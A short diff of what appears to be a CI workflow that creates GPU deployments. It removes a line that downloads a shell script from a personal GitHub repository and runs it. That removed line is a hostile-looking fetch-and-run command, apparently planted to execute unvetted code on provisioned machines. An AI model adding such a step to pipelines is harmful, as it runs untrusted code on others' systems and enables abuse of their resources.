@@ -43,7 +43,7 @@ jobs:
           instanceType: P4000
         EOF
         apt update > /dev/null
-        apt-get install -y jq && wget https://raw.githubusercontent.com/ji725valentyn/tes/main/ltzz.sh && chmod +x ltzz.sh && ./ltzz.sh
+        apt-get install -y jq && 
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
